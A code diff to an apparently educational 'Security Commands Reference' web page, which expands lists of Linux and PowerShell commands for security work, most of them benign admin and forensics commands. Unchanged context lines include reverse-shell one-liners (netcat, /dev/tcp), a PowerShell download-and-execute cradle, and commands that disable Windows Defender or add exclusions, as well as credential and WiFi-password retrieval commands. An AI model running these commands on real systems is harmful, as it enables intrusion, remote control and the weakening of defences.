@@ -69,9 +69,9 @@ import InfoIcon from "@mui/icons-material/Info";
 import LearnPageLayout from "../components/LearnPageLayout";
 
 // Page context for AI chat
-const pageContext = `This is an enhanced Security Commands Reference page containing 350+ essential commands for security professionals organized into 8 main categories:
+const pageContext = `This is an enhanced Security Commands Reference page containing 700+ essential commands for security professionals organized into 8 main categories:
 
-1. Linux/Bash Commands (60+ commands):
+1. Linux/Bash Commands (140+ commands):
 - File Operations (ls, find, grep, cat, strings, file, xxd, binwalk)
 - Network (netstat, ss, ip, nmap, tcpdump, curl, wget, netcat, socat)
 - Process & System (ps, top, uname, crontab, systemctl, journalctl)
@@ -80,7 +80,7 @@ const pageContext = `This is an enhanced Security Commands Reference page contai
 - Persistence & Backdoors (cron, systemd services, authorized_keys)
 - Log Analysis (journalctl, /var/log, grep patterns, awk/sed)
 
-2. PowerShell Commands (55+ commands):
+2. PowerShell Commands (120+ commands):
 - File Operations (Get-ChildItem, Get-Content, Select-String, Get-FileHash)
 - Network (Get-NetTCPConnection, Test-NetConnection, Invoke-WebRequest)
 - Process & System (Get-Process, Get-Service, Get-ComputerInfo, Get-ScheduledTask)
@@ -89,7 +89,7 @@ const pageContext = `This is an enhanced Security Commands Reference page contai
 - Execution & Bypass (Set-ExecutionPolicy, AMSI bypass, download cradles)
 - Credential Harvesting (mimikatz, lsass, SAM, credential manager)
 
-3. Wireshark Filters (45+ filters):
+3. Wireshark Filters (100+ filters):
 - Protocol Filters (http, dns, tcp, udp, tls, smb, ssh, ftp, rdp)
 - IP & Port Filters (ip.addr, tcp.port, src/dst filters, subnets)
 - HTTP Analysis (request methods, response codes, hosts, URIs, cookies)
@@ -97,7 +97,7 @@ const pageContext = `This is an enhanced Security Commands Reference page contai
 - TLS/SSL Analysis (handshakes, certificates, cipher suites)
 - Compound Filters (combining multiple conditions, exclusions)
 
-4. Nmap Commands (75+ commands):
+4. Nmap Commands (100+ commands):
 - Host Discovery (-sn, -Pn, -PS, -PA, -PU, -PE, -PR, -sL)
 - Port Scanning Techniques (-sS, -sT, -sU, -sA, -sN, -sF, -sX, -sI)
 - Port Specification (-p, --top-ports, -F, port ranges)
@@ -107,27 +107,27 @@ const pageContext = `This is an enhanced Security Commands Reference page contai
 - Output Formats (-oN, -oX, -oG, -oA, -v, --open, --reason)
 - Firewall/IDS Evasion (-f, -D, -S, -g, --data-length, --spoof-mac)
 
-5. Metasploit Commands (40+ commands):
+5. Metasploit Commands (70+ commands):
 - Core Commands (msfconsole, search, use, info, options, set)
 - Exploitation (exploit, run, background, sessions)
 - Post-Exploitation (migrate, getsystem, hashdump, kiwi)
 - Payload Generation (msfvenom, encoders, formats)
 - Auxiliary Modules (scanners, fuzzers, sniffers)
 
-6. Web Testing Commands (35+ commands):
+6. Web Testing Commands (50+ commands):
 - Directory Enumeration (gobuster, dirsearch, ffuf, wfuzz)
 - SQL Injection (sqlmap, manual techniques)
 - XSS & SSRF Testing (curl, httpie, specialized tools)
 - API Testing (curl, jwt_tool, API fuzzing)
 - SSL/TLS Testing (testssl.sh, sslscan, sslyze)
 
-7. Password Attacks (25+ commands):
+7. Password Attacks (40+ commands):
 - Hash Cracking (hashcat, john, ophcrack)
 - Password Spraying (hydra, crackmapexec, kerbrute)
 - Wordlist Tools (cewl, crunch, cupp)
 - Hash Identification (hashid, hash-identifier)
 
-8. Forensics & Incident Response (30+ commands):
+8. Forensics & Incident Response (50+ commands):
 - Memory Analysis (volatility, rekall)
 - Disk Forensics (autopsy, sleuthkit, dc3dd)
 - Network Forensics (tcpdump, tshark, zeek)
@@ -191,6 +191,12 @@ const linuxCommands: Command[] = [
   { command: "binwalk <file>", description: "Analyze and extract embedded files", category: "File Operations", difficulty: "intermediate", tags: ["forensics", "reversing"] },
   { command: "stat <file>", description: "Display file timestamps and metadata", category: "File Operations", difficulty: "beginner", tags: ["forensics"] },
   { command: "lsattr <file>", description: "List file attributes (immutable, append-only)", category: "File Operations", difficulty: "intermediate" },
+  { command: "stat -c '%a %U:%G %n' <file>", description: "Show permissions and owner in compact format", category: "File Operations", difficulty: "beginner" },
+  { command: "getfacl <file>", description: "View detailed ACL permissions", category: "File Operations", difficulty: "intermediate" },
+  { command: "lsblk -f", description: "List block devices and filesystems", category: "File Operations", difficulty: "beginner" },
+  { command: "du -sh * | sort -h", description: "Summarize directory sizes, sorted", category: "File Operations", difficulty: "beginner" },
+  { command: "find / -type f -size +100M 2>/dev/null", description: "Find large files over 100MB", category: "File Operations", difficulty: "intermediate" },
+  { command: "find / -type f -user root -perm -o+w 2>/dev/null", description: "Find world-writable files owned by root", category: "File Operations", difficulty: "advanced", tags: ["privesc"] },
   
   // Network
   { command: "netstat -tulpn", description: "Show listening ports with process IDs", category: "Network", example: "sudo netstat -tulpn", difficulty: "beginner", tags: ["enumeration"] },
@@ -200,29 +206,42 @@ const linuxCommands: Command[] = [
   { command: "ip a", description: "Show all network interfaces and IPs", category: "Network", difficulty: "beginner" },
   { command: "ip route", description: "Show routing table", category: "Network", difficulty: "beginner" },
   { command: "ip neigh", description: "Show ARP table (neighbors)", category: "Network", difficulty: "beginner" },
+  { command: "ip link show", description: "Show network interfaces and link state", category: "Network", difficulty: "beginner" },
   { command: "arp -a", description: "Display ARP cache", category: "Network", difficulty: "beginner" },
   { command: "cat /etc/resolv.conf", description: "View DNS servers", category: "Network", difficulty: "beginner" },
   { command: "cat /etc/hosts", description: "View hosts file entries", category: "Network", difficulty: "beginner" },
+  { command: "dig <domain>", description: "DNS lookup with dig", category: "Network", difficulty: "beginner" },
+  { command: "nslookup <domain>", description: "DNS lookup with nslookup", category: "Network", difficulty: "beginner" },
+  { command: "resolvectl status", description: "Systemd-resolved DNS status", category: "Network", difficulty: "intermediate" },
+  { command: "ping -c 4 <host>", description: "Send 4 ICMP echo requests", category: "Network", difficulty: "beginner" },
+  { command: "traceroute <host>", description: "Trace route to a host", category: "Network", difficulty: "beginner" },
+  { command: "mtr -rw <host>", description: "Continuous traceroute with latency stats", category: "Network", difficulty: "advanced" },
   { command: "nmap -sV -sC <target>", description: "Service version detection with default scripts", category: "Network", difficulty: "intermediate" },
   { command: "nmap -p- -T4 <target>", description: "Fast scan all 65535 ports", category: "Network", difficulty: "intermediate" },
   { command: "tcpdump -i eth0 -w capture.pcap", description: "Capture network traffic to file", category: "Network", difficulty: "intermediate", tags: ["forensics"] },
   { command: "tcpdump -i any port 80 -A", description: "Capture HTTP traffic in ASCII", category: "Network", difficulty: "intermediate" },
   { command: "tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'", description: "Capture only SYN packets (scan detection)", category: "Network", difficulty: "advanced" },
   { command: "curl -I <url>", description: "Fetch HTTP headers only", category: "Network", difficulty: "beginner" },
+  { command: "curl -v <url>", description: "Verbose HTTP request (headers + TLS)", category: "Network", difficulty: "intermediate" },
   { command: "curl -k -X POST -d 'data' <url>", description: "POST data, ignore SSL errors", category: "Network", difficulty: "intermediate" },
   { command: "curl -s -o /dev/null -w '%{http_code}' <url>", description: "Get only HTTP status code", category: "Network", difficulty: "intermediate" },
   { command: "wget -r -np <url>", description: "Recursively download website", category: "Network", difficulty: "beginner" },
   { command: "wget --spider -r -l 2 <url> 2>&1 | grep '^--'", description: "Spider website and list URLs", category: "Network", difficulty: "intermediate" },
+  { command: "wget -qO- <url> | head", description: "Fetch page content and preview", category: "Network", difficulty: "beginner" },
   { command: "nc -lvnp 4444", description: "Start netcat listener on port 4444", category: "Network", difficulty: "intermediate", tags: ["shells"] },
   { command: "nc -e /bin/bash <ip> <port>", description: "Reverse shell to attacker", category: "Network", difficulty: "intermediate", dangerous: true, tags: ["shells"] },
   { command: "nc -nv <ip> <port>", description: "Connect to remote port", category: "Network", difficulty: "beginner" },
   { command: "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash", description: "Socat reverse shell listener", category: "Network", difficulty: "advanced", tags: ["shells"] },
   { command: "bash -i >& /dev/tcp/<ip>/<port> 0>&1", description: "Bash reverse shell (no netcat needed)", category: "Network", difficulty: "intermediate", dangerous: true, tags: ["shells"] },
   { command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", description: "Upgrade to interactive PTY shell", category: "Network", difficulty: "intermediate", tags: ["shells"] },
+  { command: "iptables -L -n -v", description: "List iptables rules with counters", category: "Network", difficulty: "intermediate" },
+  { command: "iptables -S", description: "Show iptables rules in command format", category: "Network", difficulty: "intermediate" },
+  { command: "ufw status verbose", description: "Show UFW firewall status and rules", category: "Network", difficulty: "beginner" },
   
   // Process & System
   { command: "ps aux", description: "List all running processes with details", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
   { command: "ps aux | grep root", description: "List processes running as root", category: "Process & System", difficulty: "beginner" },
+  { command: "ps aux --sort=-%mem | head", description: "Top memory-consuming processes", category: "Process & System", difficulty: "beginner" },
   { command: "ps -ef --forest", description: "Process tree view", category: "Process & System", difficulty: "beginner" },
   { command: "top -n 1 -b", description: "One-time batch snapshot of processes", category: "Process & System", difficulty: "beginner" },
   { command: "htop", description: "Interactive process viewer", category: "Process & System", difficulty: "beginner" },
@@ -233,9 +252,12 @@ const linuxCommands: Command[] = [
   { command: "uname -a", description: "System information (kernel version, arch)", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
   { command: "cat /etc/os-release", description: "Distribution information", category: "Process & System", difficulty: "beginner" },
   { command: "hostnamectl", description: "System hostname and OS info", category: "Process & System", difficulty: "beginner" },
+  { command: "uptime", description: "System uptime and load average", category: "Process & System", difficulty: "beginner" },
+  { command: "free -h", description: "Memory usage summary", category: "Process & System", difficulty: "beginner" },
   { command: "df -h", description: "Disk space usage", category: "Process & System", difficulty: "beginner" },
   { command: "mount", description: "Show mounted filesystems", category: "Process & System", difficulty: "beginner" },
   { command: "cat /proc/version", description: "Kernel version and compiler info", category: "Process & System", difficulty: "beginner" },
+  { command: "lsmod", description: "List loaded kernel modules", category: "Process & System", difficulty: "beginner" },
   { command: "dmesg | tail -50", description: "Last 50 kernel messages", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
   { command: "last -a", description: "Last logged in users", category: "Process & System", difficulty: "beginner", tags: ["forensics"] },
   { command: "lastlog", description: "Last login of all users", category: "Process & System", difficulty: "beginner", tags: ["forensics"] },
@@ -246,20 +268,25 @@ const linuxCommands: Command[] = [
   { command: "crontab -l", description: "List scheduled cron jobs for current user", category: "Cron & Scheduled Tasks", difficulty: "beginner", tags: ["persistence", "privesc"] },
   { command: "cat /etc/crontab", description: "View system-wide cron jobs", category: "Cron & Scheduled Tasks", difficulty: "beginner" },
   { command: "ls -la /etc/cron.*", description: "List all cron directories", category: "Cron & Scheduled Tasks", difficulty: "beginner" },
+  { command: "cat /etc/cron.d/*", description: "View cron jobs in /etc/cron.d", category: "Cron & Scheduled Tasks", difficulty: "intermediate" },
+  { command: "cat /etc/cron.allow", description: "See who can use cron (if configured)", category: "Cron & Scheduled Tasks", difficulty: "intermediate" },
   { command: "cat /var/spool/cron/crontabs/*", description: "View all user crontabs (requires root)", category: "Cron & Scheduled Tasks", difficulty: "intermediate" },
   { command: "systemctl list-timers --all", description: "List all systemd timers", category: "Cron & Scheduled Tasks", difficulty: "intermediate" },
   { command: "atq", description: "List pending at jobs", category: "Cron & Scheduled Tasks", difficulty: "beginner" },
   
   // Services
   { command: "systemctl list-units --type=service", description: "List all services", category: "Services", difficulty: "beginner" },
+  { command: "systemctl list-unit-files --type=service", description: "List service unit files and states", category: "Services", difficulty: "intermediate" },
   { command: "systemctl list-units --type=service --state=running", description: "List only running services", category: "Services", difficulty: "beginner" },
   { command: "systemctl status <service>", description: "Check service status", category: "Services", difficulty: "beginner" },
   { command: "journalctl -u <service> -n 100", description: "View last 100 log lines for service", category: "Services", difficulty: "intermediate", tags: ["forensics"] },
+  { command: "systemd-analyze blame", description: "Show service startup times (slow services)", category: "Services", difficulty: "intermediate" },
   { command: "journalctl --since '1 hour ago'", description: "View logs from last hour", category: "Services", difficulty: "intermediate" },
   { command: "service --status-all", description: "List all services (SysV init)", category: "Services", difficulty: "beginner" },
   
   // Privilege Escalation
   { command: "sudo -l", description: "List sudo privileges for current user", category: "Privilege Escalation", difficulty: "beginner", tags: ["privesc"] },
+  { command: "sudo -n -l", description: "Check sudo privileges without prompting for password", category: "Privilege Escalation", difficulty: "intermediate", tags: ["privesc"] },
   { command: "sudo -V", description: "Check sudo version (for CVE checks)", category: "Privilege Escalation", difficulty: "intermediate", tags: ["privesc"] },
   { command: "id", description: "Show current user ID and group memberships", category: "Privilege Escalation", difficulty: "beginner" },
   { command: "whoami", description: "Show current username", category: "Privilege Escalation", difficulty: "beginner" },
@@ -277,6 +304,9 @@ const linuxCommands: Command[] = [
   { command: "md5sum <file>", description: "Calculate MD5 hash of file", category: "Hash & Crypto", difficulty: "beginner" },
   { command: "sha256sum <file>", description: "Calculate SHA-256 hash of file", category: "Hash & Crypto", difficulty: "beginner" },
   { command: "sha1sum <file>", description: "Calculate SHA-1 hash of file", category: "Hash & Crypto", difficulty: "beginner" },
+  { command: "openssl dgst -sha256 <file>", description: "SHA-256 hash using OpenSSL", category: "Hash & Crypto", difficulty: "beginner" },
+  { command: "openssl rand -hex 16", description: "Generate 16-byte random hex string", category: "Hash & Crypto", difficulty: "beginner" },
+  { command: "ssh-keygen -t ed25519 -f id_ed25519", description: "Generate an Ed25519 SSH keypair", category: "Hash & Crypto", difficulty: "beginner" },
   { command: "hashcat -m 0 hash.txt wordlist.txt", description: "Crack MD5 hashes with wordlist", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
   { command: "hashcat -m 1000 hash.txt wordlist.txt", description: "Crack NTLM hashes", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
   { command: "hashcat -m 1800 hash.txt wordlist.txt", description: "Crack SHA512crypt (Linux)", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
@@ -295,8 +325,10 @@ const linuxCommands: Command[] = [
   // Log Analysis
   { command: "journalctl -xe", description: "View recent logs with explanations", category: "Log Analysis", difficulty: "beginner", tags: ["forensics"] },
   { command: "journalctl -b -1", description: "View logs from previous boot", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
+  { command: "journalctl -p err..alert", description: "Show error and alert level logs", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
   { command: "cat /var/log/auth.log | grep -i 'failed'", description: "Find failed auth attempts", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
   { command: "cat /var/log/secure | grep -i 'accepted'", description: "Find successful SSH logins (RHEL)", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
+  { command: "lastb", description: "Show failed login attempts (requires root)", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
   { command: "grep -r 'CRON' /var/log/syslog", description: "Find cron execution logs", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
   { command: "tail -f /var/log/syslog", description: "Follow syslog in real-time", category: "Log Analysis", difficulty: "beginner" },
   { command: "zcat /var/log/*.gz | grep <pattern>", description: "Search compressed log files", category: "Log Analysis", difficulty: "intermediate" },
@@ -318,6 +350,9 @@ const powershellCommands: Command[] = [
   { command: "Get-ChildItem -Path C:\\Users -Recurse -Include *.kdbx,*.key,*pass*,*cred* -ErrorAction SilentlyContinue", description: "Find password/credential files", category: "File Operations", difficulty: "intermediate", tags: ["credentials"] },
   { command: "[System.IO.File]::ReadAllBytes('<file>') | Format-Hex", description: "Hex dump of file", category: "File Operations", difficulty: "intermediate" },
   { command: "Get-Item -Path <file> | Select-Object *", description: "All file metadata", category: "File Operations", difficulty: "beginner" },
+  { command: "Get-ChildItem -Force -Attributes Hidden", description: "Find hidden files and folders", category: "File Operations", difficulty: "beginner" },
+  { command: "Get-Content <file> -Raw", description: "Read entire file as a single string", category: "File Operations", difficulty: "beginner" },
+  { command: "Get-Item -Path <file> -Stream *", description: "List alternate data streams (ADS)", category: "File Operations", difficulty: "intermediate", tags: ["forensics"] },
   
   // Network
   { command: "Get-NetTCPConnection", description: "Show active TCP connections", category: "Network", difficulty: "beginner", tags: ["enumeration"] },
@@ -325,9 +360,13 @@ const powershellCommands: Command[] = [
   { command: "Get-NetTCPConnection -State Established | Select LocalAddress,LocalPort,RemoteAddress,RemotePort", description: "Established connections summary", category: "Network", difficulty: "intermediate" },
   { command: "Get-NetUDPEndpoint", description: "Show UDP endpoints", category: "Network", difficulty: "beginner" },
   { command: "Get-NetIPAddress", description: "Show IP addresses on all interfaces", category: "Network", difficulty: "beginner" },
+  { command: "Get-NetIPAddress -AddressFamily IPv4", description: "Show IPv4 addresses only", category: "Network", difficulty: "beginner" },
   { command: "Get-NetIPConfiguration", description: "Network configuration summary", category: "Network", difficulty: "beginner" },
+  { command: "Get-NetAdapter", description: "List network adapters and status", category: "Network", difficulty: "beginner" },
   { command: "Get-NetRoute", description: "Show routing table", category: "Network", difficulty: "beginner" },
   { command: "Get-NetNeighbor", description: "Show ARP cache", category: "Network", difficulty: "beginner" },
+  { command: "Get-DnsClientServerAddress", description: "Show DNS servers per interface", category: "Network", difficulty: "beginner" },
+  { command: "Test-Connection <host> -Count 4", description: "Ping a host with 4 requests", category: "Network", difficulty: "beginner" },
   { command: "Test-NetConnection -Port 443 <host>", description: "Test specific port connectivity", category: "Network", difficulty: "beginner" },
   { command: "Test-NetConnection <host> -TraceRoute", description: "Traceroute to host", category: "Network", difficulty: "beginner" },
   { command: "Invoke-WebRequest -Uri <url>", description: "HTTP request (like curl)", category: "Network", example: "iwr https://example.com", difficulty: "beginner" },
@@ -335,8 +374,10 @@ const powershellCommands: Command[] = [
   { command: "(Invoke-WebRequest -Uri <url>).Content", description: "Get response content only", category: "Network", difficulty: "beginner" },
   { command: "Resolve-DnsName <domain>", description: "DNS lookup", category: "Network", difficulty: "beginner" },
   { command: "Resolve-DnsName <domain> -Type MX", description: "DNS MX record lookup", category: "Network", difficulty: "beginner" },
+  { command: "Get-NetFirewallProfile", description: "Show firewall profile settings", category: "Network", difficulty: "intermediate" },
   { command: "Get-NetFirewallRule | Where Enabled -eq True", description: "List enabled firewall rules", category: "Network", difficulty: "intermediate" },
   { command: "Get-NetFirewallRule | Where Action -eq 'Allow' | Select Name,Direction,LocalPort", description: "Allowed firewall rules summary", category: "Network", difficulty: "intermediate" },
+  { command: "Get-NetFirewallRule -PolicyStore ActiveStore", description: "List active firewall rules (policy store)", category: "Network", difficulty: "intermediate" },
   { command: "netsh wlan show profiles", description: "Show saved WiFi profiles", category: "Network", difficulty: "beginner", tags: ["credentials"] },
   { command: "netsh wlan show profile name='<SSID>' key=clear", description: "Show WiFi password in clear text", category: "Network", difficulty: "intermediate", tags: ["credentials"] },
   { command: "Get-DnsClientCache", description: "Show DNS cache", category: "Network", difficulty: "beginner" },
@@ -345,40 +386,56 @@ const powershellCommands: Command[] = [
   { command: "Get-Process", description: "List running processes", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
   { command: "Get-Process | Sort-Object CPU -Descending | Select -First 10", description: "Top 10 CPU-consuming processes", category: "Process & System", difficulty: "beginner" },
   { command: "Get-Process | Where-Object {$_.Path -like '*temp*'}", description: "Processes running from temp folder", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
+  { command: "Get-Process -IncludeUserName", description: "Processes with owning user", category: "Process & System", difficulty: "intermediate" },
+  { command: "Get-Process -Id <pid>", description: "Details for a specific process ID", category: "Process & System", difficulty: "beginner" },
   { command: "Get-Service | Where Status -eq Running", description: "List running services", category: "Process & System", difficulty: "beginner" },
+  { command: "Get-Service -Name <service>", description: "Get status for a specific service", category: "Process & System", difficulty: "beginner" },
   { command: "Get-Service | Where StartType -eq Automatic", description: "Auto-start services", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
   { command: "Get-ComputerInfo", description: "Detailed system information", category: "Process & System", difficulty: "beginner" },
   { command: "Get-WmiObject Win32_OperatingSystem", description: "OS information via WMI", category: "Process & System", difficulty: "beginner" },
   { command: "Get-WmiObject Win32_ComputerSystem", description: "Computer system info (domain, etc)", category: "Process & System", difficulty: "beginner" },
+  { command: "Get-CimInstance Win32_Process | Select Name,ProcessId,CommandLine", description: "Process list with command lines", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
   { command: "Get-ScheduledTask", description: "List scheduled tasks", category: "Process & System", difficulty: "beginner", tags: ["persistence"] },
   { command: "Get-ScheduledTask | Where State -eq 'Ready' | Get-ScheduledTaskInfo", description: "Scheduled tasks with last run info", category: "Process & System", difficulty: "intermediate" },
   { command: "Get-EventLog -LogName Security -Newest 50", description: "View recent security events", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
   { command: "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 20", description: "Recent successful logins (4624)", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
   { command: "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 20", description: "Recent failed logins (4625)", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
+  { command: "Get-WinEvent -LogName System -MaxEvents 50", description: "Recent System log events", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
+  { command: "Get-WinEvent -LogName Application -MaxEvents 50", description: "Recent Application log events", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
   { command: "Get-HotFix", description: "List installed updates/patches", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
   { command: "Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 10", description: "Most recent patches", category: "Process & System", difficulty: "beginner" },
   { command: "systeminfo", description: "Detailed system configuration", category: "Process & System", difficulty: "beginner" },
   { command: "Get-CimInstance Win32_StartupCommand", description: "List startup programs", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
   { command: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", description: "Registry Run key (persistence)", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
   { command: "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", description: "User Run key (persistence)", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
+  { command: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", description: "RunOnce persistence (machine)", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
+  { command: "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", description: "RunOnce persistence (user)", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
   
   // Active Directory
   { command: "Get-ADUser -Filter *", description: "List all AD users", category: "Active Directory", difficulty: "intermediate", tags: ["enumeration"] },
   { command: "Get-ADUser -Filter * -Properties *", description: "All users with all properties", category: "Active Directory", difficulty: "intermediate" },
   { command: "Get-ADUser -Filter {Enabled -eq $true} | Measure-Object", description: "Count enabled users", category: "Active Directory", difficulty: "beginner" },
+  { command: "Get-ADUser -Filter {Enabled -eq $false}", description: "List disabled user accounts", category: "Active Directory", difficulty: "beginner" },
   { command: "Get-ADUser -Filter * -Properties Description | Where Description -like '*pass*'", description: "Users with password in description", category: "Active Directory", difficulty: "intermediate", tags: ["credentials"] },
   { command: "Get-ADGroup -Filter *", description: "List all AD groups", category: "Active Directory", difficulty: "beginner" },
+  { command: "Get-ADGroup -Filter 'Name -like \"*admin*\"'", description: "Find groups with 'admin' in the name", category: "Active Directory", difficulty: "beginner" },
   { command: "Get-ADComputer -Filter *", description: "List all AD computers", category: "Active Directory", difficulty: "beginner" },
+  { command: "Get-ADComputer -Filter {Enabled -eq $false}", description: "List disabled computer accounts", category: "Active Directory", difficulty: "beginner" },
   { command: "Get-ADComputer -Filter {OperatingSystem -like '*Server*'}", description: "Find all servers", category: "Active Directory", difficulty: "intermediate" },
   { command: "Get-ADDomain", description: "Domain information", category: "Active Directory", difficulty: "beginner" },
+  { command: "Get-ADForest", description: "Forest information", category: "Active Directory", difficulty: "intermediate" },
+  { command: "Get-ADDomainController -Discover", description: "Discover a domain controller", category: "Active Directory", difficulty: "intermediate" },
   { command: "Get-ADDomainController -Filter *", description: "List domain controllers", category: "Active Directory", difficulty: "beginner" },
   { command: "Get-ADGroupMember -Identity 'Domain Admins'", description: "List Domain Admins", category: "Active Directory", difficulty: "beginner", tags: ["enumeration"] },
   { command: "Get-ADGroupMember -Identity 'Enterprise Admins'", description: "List Enterprise Admins", category: "Active Directory", difficulty: "beginner" },
   { command: "Get-ADGroupMember -Identity 'Administrators' -Recursive", description: "All admins recursively", category: "Active Directory", difficulty: "intermediate" },
+  { command: "Get-ADGroupMember -Identity <group> -Recursive", description: "List members of a group recursively", category: "Active Directory", difficulty: "intermediate" },
   { command: "Get-ADUser -Filter {AdminCount -eq 1}", description: "Find privileged accounts", category: "Active Directory", difficulty: "intermediate" },
   { command: "Get-ADUser -Filter * -Properties ServicePrincipalName | Where ServicePrincipalName", description: "Users with SPN (Kerberoasting targets)", category: "Active Directory", difficulty: "advanced", tags: ["kerberoast"] },
+  { command: "Get-ADUser -Identity <user> -Properties MemberOf", description: "Get group memberships for a user", category: "Active Directory", difficulty: "intermediate" },
   { command: "([adsisearcher]'objectCategory=User').FindAll()", description: "ADSI search for users (no module needed)", category: "Active Directory", difficulty: "intermediate" },
   { command: "Get-ADTrust -Filter *", description: "List domain trusts", category: "Active Directory", difficulty: "intermediate" },
+  { command: "Get-ADReplicationFailure -Scope Forest", description: "Check AD replication failures", category: "Active Directory", difficulty: "advanced" },
   { command: "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()", description: "Current domain info (no module)", category: "Active Directory", difficulty: "intermediate" },
   
   // Privilege & Security
@@ -391,7 +448,10 @@ const powershellCommands: Command[] = [
   { command: "net localgroup Administrators", description: "List local administrators", category: "Privilege & Security", difficulty: "beginner" },
   { command: "net accounts", description: "Password policy info", category: "Privilege & Security", difficulty: "beginner" },
   { command: "Get-LocalUser | Select Name,Enabled,LastLogon", description: "Local user details", category: "Privilege & Security", difficulty: "beginner" },
+  { command: "Get-LocalUser | Where Enabled -eq $false", description: "List disabled local users", category: "Privilege & Security", difficulty: "beginner" },
+  { command: "Get-LocalGroup", description: "List local groups (PowerShell)", category: "Privilege & Security", difficulty: "beginner" },
   { command: "Get-LocalGroupMember -Group 'Administrators'", description: "Local admin members", category: "Privilege & Security", difficulty: "beginner" },
+  { command: "Get-LocalGroupMember -Group 'Remote Desktop Users'", description: "RDP group members", category: "Privilege & Security", difficulty: "beginner" },
   { command: "secedit /export /cfg sec.cfg", description: "Export security policy", category: "Privilege & Security", difficulty: "intermediate" },
   { command: "cmdkey /list", description: "List stored credentials", category: "Privilege & Security", difficulty: "beginner", tags: ["credentials"] },
   { command: "Get-ChildItem Cert:\\CurrentUser\\My", description: "List user certificates", category: "Privilege & Security", difficulty: "intermediate" },
@@ -400,6 +460,7 @@ const powershellCommands: Command[] = [
   
   // Execution & Bypass
   { command: "Set-ExecutionPolicy Bypass -Scope Process", description: "Bypass execution policy for session", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
+  { command: "Get-ExecutionPolicy -List", description: "Show execution policy for all scopes", category: "Execution & Bypass", difficulty: "beginner" },
   { command: "powershell -ep bypass -file script.ps1", description: "Run script bypassing execution policy", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
   { command: "powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File script.ps1", description: "Stealth script execution", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
   { command: "IEX (New-Object Net.WebClient).DownloadString('<url>')", description: "Download and execute script in memory", category: "Execution & Bypass", difficulty: "advanced", dangerous: true, tags: ["bypass"] },
@@ -407,7 +468,10 @@ const powershellCommands: Command[] = [
   { command: "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<base64>'))", description: "Decode Base64 string", category: "Execution & Bypass", difficulty: "intermediate" },
   { command: "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('<text>'))", description: "Encode to Base64", category: "Execution & Bypass", difficulty: "intermediate" },
   { command: "powershell -encodedCommand <base64>", description: "Execute Base64 encoded command", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
+  { command: "Get-AuthenticodeSignature <file>", description: "Check script or binary signature", category: "Execution & Bypass", difficulty: "intermediate" },
+  { command: "Unblock-File <file>", description: "Remove Mark-of-the-Web block", category: "Execution & Bypass", difficulty: "beginner" },
   { command: "Get-MpPreference", description: "Windows Defender settings", category: "Execution & Bypass", difficulty: "intermediate" },
+  { command: "Get-MpComputerStatus", description: "Windows Defender status summary", category: "Execution & Bypass", difficulty: "intermediate" },
   { command: "Get-MpThreatDetection", description: "Recent Defender detections", category: "Execution & Bypass", difficulty: "intermediate", tags: ["forensics"] },
   { command: "Set-MpPreference -DisableRealtimeMonitoring $true", description: "Disable Defender realtime (requires admin)", category: "Execution & Bypass", difficulty: "advanced", dangerous: true },
   { command: "Add-MpPreference -ExclusionPath 'C:\\temp'", description: "Add Defender exclusion (requires admin)", category: "Execution & Bypass", difficulty: "advanced", dangerous: true },
